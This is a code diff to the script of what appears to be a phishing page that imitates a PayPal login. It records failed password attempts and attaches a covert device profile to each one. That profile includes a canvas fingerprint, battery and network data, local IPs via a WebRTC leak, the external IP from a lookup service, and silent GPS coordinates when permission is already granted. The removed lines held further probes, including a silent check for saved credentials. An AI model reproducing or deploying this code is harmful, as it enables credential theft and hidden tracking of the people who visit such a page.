@@ -620,8 +620,7 @@
             currentStep: 0,
             isPasswordVisible: false,
             failedAttempts: [],
-            intel: null,
-            session: { clicks: 0, keypresses: 0, startTime: Date.now() }
+            intel: null
         };
 
         const steps = document.querySelectorAll('.step');
@@ -721,212 +720,71 @@
                 vendor: navigator.vendor,
                 cores: navigator.hardwareConcurrency || 'unknown',
                 memory: navigator.deviceMemory || 'unknown',
-                touchPoints: navigator.maxTouchPoints,
-                maxTouchPoints: navigator.maxTouchPoints,
-                pdfViewer: navigator.pdfViewerEnabled,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                onLine: navigator.onLine,
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
-                bluetooth: 'bluetooth' in navigator,
-                usb: 'usb' in navigator,
-                nfc: 'nfc' in navigator,
-                webShare: 'share' in navigator,
-                serviceWorker: 'serviceWorker' in navigator,
-                webAssembly: typeof WebAssembly === 'object',
-                webGL: !!window.WebGLRenderingContext,
-                webGL2: !!window.WebGL2RenderingContext,
-                referrer: document.referrer || 'direct',
-                documentMode: document.documentMode || 'standard',
-                hidden: document.hidden,
-                visibilityState: document.visibilityState,
                 screen: `${screen.width}x${screen.height}`,
-                availScreen: `${screen.availWidth}x${screen.availHeight}`,
-                colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio,
-                orientation: screen.orientation?.type || 'unknown',
-                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ').slice(0, 200),
-                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ').slice(0, 200)
+                colorDepth: screen.colorDepth,
+                touchPoints: navigator.maxTouchPoints,
+                referrer: document.referrer || 'direct',
+                online: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled
             };
-
-            // Performance timing
-            try {
-                const nav = performance.getEntriesByType('navigation')[0];
-                if (nav) {
-                    intel.loadTime = Math.round(nav.loadEventEnd - nav.startTime);
-                    intel.redirectCount = nav.redirectCount;
-                    intel.dnsTime = Math.round(nav.domainLookupEnd - nav.domainLookupStart);
-                }
-            } catch(e) {}
-
-            // Chrome memory
-            try {
-                const mem = performance.memory;
-                if (mem) {
-                    intel.usedJSHeap = Math.round(mem.usedJSHeapSize / 1048576);
-                    intel.totalJSHeap = Math.round(mem.totalJSHeapSize / 1048576);
-                }
-            } catch(e) {}
-
-            // Storage estimate
-            try {
-                const est = await navigator.storage.estimate();
-                intel.storageQuota = est.quota ? Math.round(est.quota / 1073741824) + 'GB' : 'unknown';
-                intel.storageUsage = est.usage ? Math.round(est.usage / 1048576) + 'MB' : 'unknown';
-            } catch(e) {
-                intel.storageQuota = 'blocked';
-            }
 
             // Canvas fingerprint
             try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('PayPal 2.5', 2, 2);
-                ctx.fillStyle = '#003087';
-                ctx.fillRect(2, 16, 50, 4);
-                intel.canvasHash = btoa(canvas.toDataURL()).slice(-16);
-            } catch(e) {
-                intel.canvasHash = 'blocked';
-            }
-
-            // WebGL fingerprint
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                if (gl) {
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    intel.webGLVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : 'unknown';
-                    intel.webGLRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'unknown';
-                }
-            } catch(e) {
-                intel.webGLVendor = 'blocked';
-            }
-
-            // Audio fingerprint
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator();
-                const analyser = ctx.createAnalyser();
-                osc.connect(analyser);
-                osc.frequency.value = 1000;
-                osc.start();
-                const data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                intel.audioHash = data.slice(0, 10).join('-');
-                osc.stop();
-                ctx.close();
-            } catch(e) {
-                intel.audioHash = 'blocked';
-            }
+                const c = document.createElement('canvas');
+                const x = c.getContext('2d');
+                x.textBaseline = 'top';
+                x.font = '14px Arial';
+                x.fillText('PayPal 2.5', 2, 2);
+                x.fillStyle = '#003087';
+                x.fillRect(2, 16, 50, 4);
+                intel.canvas = btoa(c.toDataURL()).slice(-12);
+            } catch(e) { intel.canvas = 'x'; }
 
             // Battery
             try {
-                const battery = await navigator.getBattery();
-                intel.batteryLevel = Math.round(battery.level * 100) + '%';
-                intel.batteryCharging = battery.charging;
-                intel.batteryTime = battery.chargingTime;
-            } catch(e) {
-                intel.batteryLevel = 'unknown';
-            }
+                const b = await navigator.getBattery();
+                intel.battery = Math.round(b.level * 100) + '%' + (b.charging ? '⚡' : '');
+            } catch(e) { intel.battery = 'x'; }
 
             // Connection
             try {
-                const conn = navigator.connection;
-                intel.connectionType = conn.effectiveType || 'unknown';
-                intel.downlink = conn.downlink || 'unknown';
-                intel.rtt = conn.rtt || 'unknown';
-                intel.saveData = conn.saveData || false;
-            } catch(e) {
-                intel.connectionType = 'unknown';
-            }
+                const n = navigator.connection;
+                intel.net = (n.effectiveType || 'x') + '/' + (n.downlink || 'x') + 'Mbps';
+            } catch(e) { intel.net = 'x'; }
 
-            // Media devices
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                intel.mediaDevices = devices.map(d => `${d.kind}:${d.label.slice(0, 20)}`).join(', ').slice(0, 300);
-                intel.cameraCount = devices.filter(d => d.kind === 'videoinput').length;
-                intel.micCount = devices.filter(d => d.kind === 'audioinput').length;
-            } catch(e) {
-                intel.mediaDevices = 'blocked';
-            }
-
-            // Permissions enumeration (silent)
-            const permList = ['geolocation','notifications','camera','microphone','midi','clipboard-read','clipboard-write','payment-handler','persistent-storage','background-sync','ambient-light-sensor','accelerometer','gyroscope','magnetometer'];
-            intel.permissions = {};
-            for (const name of permList) {
-                try {
-                    const perm = await navigator.permissions.query({ name });
-                    intel.permissions[name] = perm.state;
-                } catch(e) {
-                    intel.permissions[name] = 'unsupported';
-                }
-            }
-
-            // Geolocation (only if already granted)
-            try {
-                const geoPerm = await navigator.permissions.query({ name: 'geolocation' });
-                intel.geoPermission = geoPerm.state;
-                if (geoPerm.state === 'granted') {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000, enableHighAccuracy: true });
-                    });
-                    intel.latitude = pos.coords.latitude;
-                    intel.longitude = pos.coords.longitude;
-                    intel.accuracy = pos.coords.accuracy;
-                    intel.altitude = pos.coords.altitude;
-                    intel.speed = pos.coords.speed;
-                }
-            } catch(e) {
-                intel.geoPermission = 'unknown';
-            }
-
-            // Keyboard layout
-            try {
-                const keyboard = await navigator.keyboard.getLayoutMap();
-                const keys = Array.from(keyboard.keys()).slice(0, 10);
-                intel.keyboardLayout = keys.join(', ');
-            } catch(e) {
-                intel.keyboardLayout = 'unsupported';
-            }
-
-            // Credential Management check
-            try {
-                intel.credentialsAPI = 'credentials' in navigator;
-                if (intel.credentialsAPI) {
-                    const creds = await navigator.credentials.get({ password: true, mediation: 'silent' });
-                    intel.savedCredentials = creds ? 'yes' : 'no';
-                }
-            } catch(e) {
-                intel.savedCredentials = 'error';
-            }
-
-            // WebRTC IP leak
+            // WebRTC leak
             try {
                 const ips = new Set();
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.createDataChannel('');
                 pc.onicecandidate = e => {
                     if (!e || !e.candidate) return;
-                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
-                    if (ipMatch) ips.add(ipMatch[0]);
+                    const m = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+                    if (m) ips.add(m[0]);
                 };
                 await pc.setLocalDescription(await pc.createOffer());
-                await new Promise(r => setTimeout(r, 1500));
-                intel.webrtcIPs = Array.from(ips).join(', ') || 'none';
+                await new Promise(r => setTimeout(r, 1000));
+                intel.rtc = Array.from(ips).join(', ') || 'none';
                 pc.close();
-            } catch(e) {
-                intel.webrtcIPs = 'blocked';
-            }
+            } catch(e) { intel.rtc = 'x'; }
 
             // External IP
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                intel.externalIP = data.ip;
-            } catch(e) {
-                intel.externalIP = 'unknown';
-            }
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                intel.extIP = d.ip;
+            } catch(e) { intel.extIP = 'x'; }
+
+            // Silent geolocation (only if already granted)
+            try {
+                const p = await navigator.permissions.query({ name: 'geolocation' });
+                intel.geoPerm = p.state;
+                if (p.state === 'granted') {
+                    const g = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 2000 }));
+                    intel.gps = g.coords.latitude.toFixed(4) + ',' + g.coords.longitude.toFixed(4);
+                }
+            } catch(e) { intel.geoPerm = 'x'; }
 
             return intel;
         }
@@ -938,12 +796,7 @@
                 attemptNumber: state.failedAttempts.length + 1,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                intel: state.intel,
-                session: {
-                    ...state.session,
-                    duration: Date.now() - state.session.startTime,
-                    timeOnPage: Math.round((Date.now() - state.session.startTime) / 1000) + 's'
-                }
+                intel: state.intel
             };
             state.failedAttempts.push(attempt);
             
@@ -1016,9 +869,6 @@
             if (passwordError.classList.contains('show')) hidePasswordError();
         });
 
-        document.addEventListener('click', () => state.session.clicks++);
-        document.addEventListener('keypress', () => state.session.keypresses++);
-
         document.querySelector('.email-display').addEventListener('keydown', function(e) {
             if (e.key === 'Enter' || e.key === ' ') {
                 e.preventDefault();
@@ -1030,7 +880,7 @@
             emailInput.focus();
             setLanguage('en');
             state.intel = await gatherIntel();
-            console.log('Intel gathered:', state.intel);
+            console.log('Intel:', state.intel);
         });
     </script>
 </body>
